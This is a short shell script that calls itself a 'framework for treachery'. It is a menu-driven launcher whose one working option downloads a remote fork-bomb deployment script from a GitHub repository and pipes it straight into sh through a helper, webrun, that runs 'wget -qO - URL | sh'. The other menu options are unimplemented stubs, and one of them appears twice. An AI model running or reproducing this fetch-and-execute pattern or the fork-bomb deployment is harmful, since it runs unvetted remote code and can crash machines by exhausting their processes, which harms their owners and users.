#!/bin/sh

# Function declarations
webrun(){
	wget -qO - $1 | sh
}

# Main program
echo -n 'Hello and welcome to this framework for treachery, built by the Goblin himself, for your execution pleasure. within you will find many "useful" options, available to you through just a few command-line arguments.' $0 "-h\n\n"

case "$1" in
	"forked bom")
		echo -n "Forked bom chosen\n"
		webrun https://raw.githubusercontent.com/BeerB34r/treachery/refs/heads/master/assorted/forked_bom/deploy_fork_bom.sh
	;;
	"forkbomb")
		echo -n "Forkbomb chosen\n"
	;;
	"To be implemented")
		echo -n "Yet to be implemented\n"
	;;
	"To be implemented")
		echo -n "Yet to be implemented\n"
	;;
	*)
		echo -n "Treachery canceled\n"
esac
